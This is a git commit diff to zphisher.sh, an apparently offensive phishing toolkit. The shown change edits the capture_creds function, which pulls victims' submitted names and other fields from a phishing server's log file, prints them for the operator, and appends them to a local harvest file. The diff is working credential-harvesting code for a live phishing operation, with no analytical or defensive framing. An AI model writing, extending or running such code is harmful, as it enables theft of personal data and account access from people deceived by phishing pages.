2906674b46d1111413e8108f5dcf64c34af7e860
Umer Shabbir <75672616+Umer-Shabbir@users.noreply.github.com>
2024-01-24 02:43:20 +0500

    Update zphisher.sh

--- zphisher.sh
+++ zphisher.sh
@@ -421,10 +421,10 @@ capture_ip() {
 ## Get credentials
 capture_creds() {
 	Name=$(grep -o 'Name:.*' .server/www/usernames.txt | awk '{print $2}')
-	Fathers Name=$(grep -o 'Father:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	FathersName=$(grep -o 'Father:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Name : ${BLUE}$Name"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} FathersName : ${BLUE}$FathersName"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.txt"
 	cat .server/www/usernames.txt >> auth/usernamess.txt
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
